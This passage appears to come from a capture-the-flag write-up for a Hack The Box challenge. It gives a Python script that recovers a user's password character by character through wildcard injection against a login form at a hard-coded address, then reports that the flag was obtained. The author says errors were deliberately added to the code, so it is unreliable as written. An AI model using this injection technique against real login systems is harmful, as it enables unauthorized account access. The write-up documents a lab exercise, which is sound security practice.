import requests
from string import ascii_lowercase, ascii_uppercase

url = "http://159.65.92.13:30182/login"


headers = {'Host':"159.65.92.13:30182",
        'User-Agent':"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        'Content-Type':"application/x-www-form-urlencode",
        'Connection':"close"}

chars = ascii_lowercase+ascii_uppercase+'0123456789_{}()'

passwd = ''

while(True):
 for char in chars:
    passwd_tmp = passwd+char+'*'
    data = {'username':'reese','password':passwd_tp}
    r = requests.post(url, headers=headers, data=data)
    print(passwd_tmp)
 
    if len(r.content) != 2208 :
        passwd+=char
    elif char=='{':
        print(passwd)
        print('finish!')
        exit
print(passwd)

```

And we get a password! HTB{...}!

Note: as this is a live challenge, I sprickled a few errors into the script, feel free to correct them yourself!


